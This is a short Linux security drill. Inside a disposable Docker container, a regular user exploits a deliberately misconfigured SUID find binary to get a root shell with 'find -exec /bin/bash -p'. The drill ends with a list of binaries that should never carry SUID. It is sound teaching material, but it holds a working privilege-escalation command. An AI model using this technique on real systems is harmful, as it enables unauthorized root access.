# Drill 02: Exploiting SUID to Get Root

Time: 10 minutes

## What We're Doing

You're a regular user. You found find has SUID root (bad configuration).

You're going to use it to become root.

## Start Container as Root
```bash
docker run -it --rm ubuntu:22.04 /bin/bash
```

## Create a Regular User
```bash
useradd -m attacker
su - attacker
```

You're now 'attacker', not root anymore.

## Check Who You Are
```bash
whoami
id
```

Shows: attacker, uid=1000

You're just a regular user now.

## Break Out and Make find Dangerous

Go back to root:
```bash
exit
```

Give find the SUID bit (simulating misconfiguration):
```bash
chmod u+s /usr/bin/find
ls -l /usr/bin/find
```

Should show: `-rwsr-xr-x` (the 's' means it runs as root)

Switch back to attacker:
```bash
su - attacker
```

## Exploit It

find has -exec that runs commands. Since find is SUID root, those commands run as root too.
```bash
find /tmp -exec /bin/bash -p \;
```

What this does:
- Searches /tmp (doesn't matter what, just needs a valid path)
- Executes bash with -p flag (keeps elevated privileges)
- You get a root shell

## Check If It Worked
```bash
whoami
id
```

Should show: root, uid=0

You went from regular user to root. Game over.

## Clean Up
```bash
exit  # Leave root shell
exit  # Leave attacker user
exit  # Leave container
```

## Why This Works

find runs as root because of SUID.

find can execute other programs with -exec.

Those programs inherit root privileges.

You get root shell.

## Real World

Never give SUID to:
- find (has -exec)
- vim (has :!bash)
- less (has !/command)
- awk, perl, python (run code)
- Anything that can execute commands

Check GTFOBins.github.io for complete list of exploitable binaries.
